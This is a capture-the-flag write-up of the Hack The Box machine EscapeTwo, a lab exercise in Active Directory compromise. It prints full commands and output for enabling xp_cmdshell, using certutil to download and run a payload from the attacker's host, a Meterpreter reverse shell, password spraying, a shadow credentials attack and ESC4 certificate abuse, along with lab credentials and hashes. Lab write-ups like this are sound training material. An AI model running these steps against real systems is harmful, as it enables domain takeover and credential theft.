---
title: Hack The Box - EscapeTwo
date: 2025-05-25 00:00:00 +00:00
categories: [Hack The Box, Machines]
tags: [hackthebox, machine, escapetwo]
image: /assets/posts/htb-escapetwo/htb-escapetwo-icon.png
---

This machine is an active directory box that has an assumed breach scenario. We're given the credentials `rose:KxEPkKe6R8su`. We then discover several credentials, which lead to us capturing the user flag. Following that we perform some ACL abuse and AD CS attacks to get domain admin credentials.

## Enumeration

```sh
┌──(vantascure㉿kali)-[~/EscapeTwo/Evidence/Scans]
└─$ sudo nmap --open -p- -A -oA tcp_full_svc 10.10.11.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 16:37 IST
Stats: 0:13:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.40% done; ETC: 16:51 (0:00:49 remaining)
Stats: 0:15:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 16:52 (0:00:21 remaining)
Nmap scan report for 10.10.11.51
Host is up (0.29s latency).
Not shown: 65509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-18 11:21:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-18T11:23:42+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T11:23:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-18T11:23:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-18T07:20:15
|_Not valid after:  2055-01-18T07:20:15
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-18T11:23:42+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-18T11:23:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-01-18T11:23:07
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   162.76 ms 10.10.16.1
2   324.82 ms 10.10.11.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 998.58 seconds
```

From the Nmap scan, we can tell that this is an active directory machine. I added the domain name found in the output to my `/etc/hosts` file.

I then enumerated the SMB shares using the credentials provided.

```sh
┌──(vantascure㉿kali)-[~/EscapeTwo/Evidence/Scans]
└─$ nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares              
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            
```

On the `Accounting Department` share, I found an interesting Excel spreadsheet.

```sh
┌──(vantascure㉿kali)-[~/EscapeTwo/Evidence/Scans]
└─$ smbclient -U rose@sequel.htb //10.10.11.51/'Accounting Department'
Password for [rose@sequel.htb]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 16:22:21 2024
  ..                                  D        0  Sun Jun  9 16:22:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 15:44:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 16:22:07 2024

                6367231 blocks of size 4096. 920806 blocks available

```

I downloaded `accounts.xlsx` to my machine.

```sh
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
```

I then opened the file and found credentials.

![htb-escapetwo-1.png](/assets/posts/htb-escapetwo/htb-escapetwo-1.png)

![htb-escapetwo-1.png](/assets/posts/htb-escapetwo/htb-escapetwo-2.png)

## Foothold

I then connected to MSSQL service using the credentials I found for the `sa` user in the Excel spreadsheet.

```sh
┌──(vantascure㉿kali)-[~/EscapeTwo/Evidence]                                  
└─$ impacket-mssqlclient -p 1433 sa@10.10.11.51                                                                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                    
Password:                                                                                                            
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

I then enabled `xp_cmdshell`.

```sql
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
```

I started a Python HTTP server so that I could use it to transfer a payload.

```sh
┌──(vantascure㉿kali)-[~]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

I then downloaded the payload to the target.

```sh
SQL (sa  dbo@master)> xp_cmdshell "certutil.exe -urlcache -split -f http://10.10.16.14:8888/shell.exe C:\Users\Public\shell.exe"
output
---------------------------------------------------
****  Online  ****

  0000  ...

  1c00

CertUtil: -URLCache command completed successfully.

NULL
```

I then executed the payload.

```sh
SQL (sa  dbo@master)> xp_cmdshell "C:\Users\Public\shell.exe"
```

I was able to successfully establish a Meterpreter reverse shell.

```sh
┌──(vantascure㉿kali)-[~]
└─$ sudo msfconsole -q
[sudo] password for vantascure:
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage (203846 bytes) to 10.10.11.51
[*] Meterpreter session 1 opened (10.10.16.14:4444 -> 10.10.11.51:61757) at 2025-01-18 17:50:44 +0530

meterpreter > shell
Process 6640 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.6659]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

I then found a password for the `sql_svc` user found in the `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` file.

```sh
C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI

<SNIP>
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
<SNIP>
```

While exploring the target, I discovered that there was a user `ryan`.

```powershell
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3705-289D

 Directory of C:\Users

06/09/2024  05:42 AM    <DIR>          .
06/09/2024  05:42 AM    <DIR>          ..
12/25/2024  03:10 AM    <DIR>          Administrator
01/18/2025  04:27 AM    <DIR>          Public
06/09/2024  03:15 AM    <DIR>          ryan
06/08/2024  03:16 PM    <DIR>          sql_svc
               0 File(s)              0 bytes
               6 Dir(s)   3,354,234,880 bytes free
```

I then tried spraying the passwords I'd collected so far against `ryan`.

```sh
┌──(vantascure㉿kali)-[~]
└─$ nxc winrm 10.10.11.51 -u ryan -p passwd_list.txt
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:KxEPkKe6R8su
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd!
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

I connected to the target via WinRM as `ryan`.

```sh
┌──(vantascure㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

I then captured the user flag.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
d1cb151*************************
```

## Privilege Escalation

I then uploaded SharpHound to the target.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> upload /home/vantascure/tools/Windows/SharpHound.exe
                                        
Info: Uploading /home/vantascure/tools/Windows/SharpHound.exe to C:\Users\ryan\Desktop\SharpHound.exe
                                        
Data: 1402196 bytes of 1402196 bytes copied
                                        
Info: Upload successful!
```

I then collected domain information using SharpHound.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> .\SharpHound.exe -c All --zipfilename SEQUEL
2025-01-18T05:04:53.3731286-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
<SNIP>
2025-01-18T05:05:47.2325124-08:00|INFORMATION|Enumeration finished in 00:00:52.2309173
2025-01-18T05:05:47.4658757-08:00|INFORMATION|Saving cache with stats: 62 ID to type mappings.
 62 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-01-18T05:05:47.4824980-08:00|INFORMATION|SharpHound Enumeration Completed at 5:05 AM on 1/18/2025! Happy Graphing!
```

I then transferred the data to my machine.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> download 20250118050544_SEQUEL.zip

Info: Downloading C:\Users\ryan\Desktop\20250118050544_SEQUEL.zip to 20250118050544_SEQUEL.zip

Info: Download successful!
```

After importing the data into Bloodhound, I found that `ryan` had `WriteOwner` access to the `ca_svc`, who was part of the `Cert Publishers` group.

![htb-escapetwo-3.png](/assets/posts/htb-escapetwo/htb-escapetwo-3.png)

I then uploaded PowerView to the target.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> upload /home/vantascure/tools/Windows/PowerView.ps1
                                        
Info: Uploading /home/vantascure/tools/Windows/PowerView.ps1 to C:\Users\ryan\Desktop\PowerView.ps1
                                        
Data: 1217532 bytes of 1217532 bytes copied
                                        
Info: Upload successful!
```

I created a PSCredential object for `ryan`.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> $SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\ryan\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('SEQUEL\ryan', $SecPassword)
```

Set `ryan` as the object owner of the `ca_svc` user.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> Set-DomainObjectOwner -Credential $Cred -Identity ca_svc -OwnerIdentity ryan
```

I then re-authenticated, re-created the PSCredential object, and granted `ryan` all rights over `ca_svc`.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights All
```

> [!danger] New Attack
> Learn what's happening below.

As I had all rights over `ca_svc`, I could now carry out a shadow credentials attack.

```sh
┌──(vantascure㉿kali)-[~]
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '65a20275-f10e-f110-c023-a4f992b1b2d7'
[*] Adding Key Credential with device ID '65a20275-f10e-f110-c023-a4f992b1b2d7' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '65a20275-f10e-f110-c023-a4f992b1b2d7' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

I then used then enumerated for certificate template vulnerabilities and found that there was an ESC4 vulnerability.

```sh
┌──(vantascure㉿kali)-[~]
└─$ KRB5CCNAME=/home/vantascure/EscapeTwo/Evidence/Misc\ Files/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Using Kerberos Cache: /home/vantascure/EscapeTwo/Evidence/Misc Files/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/dc01.sequel.htb'
[+] Got TGS for 'host/dc01.sequel.htb'
[+] Bound to ldap://10.10.11.51:389 - cleartext
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.51
[+] Using Kerberos Cache: /home/vantascure/EscapeTwo/Evidence/Misc Files/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[+] Using Kerberos Cache: /home/vantascure/EscapeTwo/Evidence/Misc Files/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
[*] Got CA configuration for 'sequel-DC01-CA'
[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
[+] Connecting to 10.10.11.51:80
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

I then modified the `DunderMifflinAuthentication` template.

```sh
┌──(vantascure㉿kali)-[~]
└─$ KRB5CCNAME=/home/vantascure/EscapeTwo/Evidence/Misc\ Files/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

I then requested for a certificate impersonating the `administrator` account.

```sh
┌──(vantascure㉿kali)-[~]
└─$ certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
  "(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ",
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 67
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```

Now it’s just a matter of authenticating as the user using the PFX file that was obtained:

```sh
┌──(vantascure㉿kali)-[~]
└─$ certipy-ad auth -pfx EscapeTwo/Evidence/Misc\ Files/administrator_10.pfx -dc-ip 10.10.11.51 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

I then connected via WinRM using the hash obtained.

```sh
┌──(vantascure㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

I was then able to capture the root flag.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
3e58aab*************************
```
